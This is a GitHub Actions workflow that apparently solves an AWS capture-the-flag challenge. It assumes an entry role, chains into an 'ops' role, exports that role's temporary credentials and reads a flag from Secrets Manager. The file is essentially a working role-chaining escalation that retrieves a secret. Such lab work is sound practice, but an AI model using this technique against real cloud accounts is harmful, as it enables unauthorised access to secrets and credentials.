name: Inspect deployment
on:
  workflow_dispatch:
permissions:
  contents: read
  id-token: write
jobs:
  inspect:
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          aws-region: ap-northeast-1
          role-to-assume: arn:aws:iam::637423474569:role/ctf-q3-entry

      # - run: aws ssm get-parameter --name "/ctf/q3/hint"  
      - run: target_role=$(aws sts assume-role --role-arn arn:aws:iam::637423474569:role/ctf-q3-ops --role-session-name Session-B) &&  export AWS_ACCESS_KEY_ID=$(echo $target_role | jq -r .Credentials.AccessKeyId) && export AWS_SECRET_ACCESS_KEY=$(echo $target_role | jq -r .Credentials.SecretAccessKey) && export AWS_SESSION_TOKEN=$(echo $target_role | jq -r .Credentials.SessionToken) && aws secretsmanager get-secret-value --secret-id ctf/q3/flag

      # - name: Configure other AWS Credentials via SwitchRole
      #   uses: aws-actions/configure-aws-credentials@v4
      #   with:
      #     aws-region: ap-northeast-1
      #     role-to-assume: arn:aws:iam::637423474569:role/ctf-q3-ops
      #     role-session-name: GitHubActions_s3_cp2
          # role-chaining: true # chainする設定を"true"で指定。
      # - run: aws secretsmanager get-secret-value --secret-id ctf/q3/flag
